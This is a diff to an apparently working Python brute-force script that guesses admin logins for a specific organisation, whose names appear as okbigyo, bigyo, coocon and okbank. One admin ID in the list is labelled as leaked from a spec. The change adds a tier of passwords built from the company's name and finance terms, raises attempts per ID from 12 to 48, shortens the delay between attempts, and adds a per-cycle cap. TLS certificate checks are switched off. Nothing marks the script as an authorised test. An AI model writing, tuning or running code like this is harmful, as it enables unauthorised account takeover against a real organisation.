@@ -19,8 +19,9 @@ CTX = ssl.create_default_context()
 CTX.check_hostname = False
 CTX.verify_mode = ssl.CERT_NONE
 
-MAX_PER_ID = 12
-DELAY = 1.5
+MAX_PER_ID = 48
+DELAY = float(os.environ.get("ADMIN_DELAY", "0.7"))
+CAP = int(os.environ.get("ADMIN_CAP", "300"))
 
 IDS = [
     # spec-leaked dev name
@@ -56,6 +57,16 @@ PASSWORDS = [
     "123456789", "1234567890", "123456789!", "1234567890!",
     "a12345678", "a123456789", "q12345678", "pw123456", "temp1234",
     "20240101", "20250101", "20260101", "okbigyo2026", "bigyo2026",
+    # tier 2 — realistic corporate patterns
+    "Okbigyo!1234", "okbigyo!1234", "BIGYO1234!", "Ok_bigyo1234",
+    "okbigyo!@#", "okbigyo1234!", "Bigyo!1234", "coocon!1234", "Coocon!1234",
+    "okbigyo2024", "okbigyo2025", "bigyo2024!", "bigyo2025!", "bigyo2026!",
+    "okbank1234!", "Okbank1234!", "okbank!1234",
+    "1qaz2wsx", "1qazxsw2", "zsx1csw2", "2wsx1qaz", "1qa2ws3ed",
+    "loan1234!", "Loan1234!", "credit1234!", "Credit1234!", "money1234!",
+    "finance1234!", "admin@1234", "admin!@#", "p@ssw0rd", "Password123!",
+    "Welcome123!", "Springboot1!", "Oracle1234!", "java1234!",
+    "1234!qaws", "!qaws1234", "qaws1234!", "asdf1234!",
 ]
 
 
@@ -93,15 +104,20 @@ def main():
         return
     st = state_load()
     creds = []
+    spent = 0
     for aid in IDS:
+        if spent >= CAP:
+            print(f"CAP {CAP} reached — stopping this cycle", flush=True)
+            break
         rec = st.get(aid, {"pwd_idx": 0})
-        if rec.get("done"):
+        if rec.get("done") and rec.get("pwd_idx", 0) >= len(PASSWORDS):
             continue
         idx = rec["pwd_idx"]
-        while idx < len(PASSWORDS) and (rec.get("attempts", 0) < MAX_PER_ID):
+        while idx < len(PASSWORDS) and (rec.get("attempts", 0) < MAX_PER_ID) and spent < CAP:
             pwd = PASSWORDS[idx]
             resp = try_login(aid, pwd)
             idx += 1
+            spent += 1
             rec["pwd_idx"] = idx
             rec["attempts"] = rec.get("attempts", 0) + 1
             st[aid] = rec
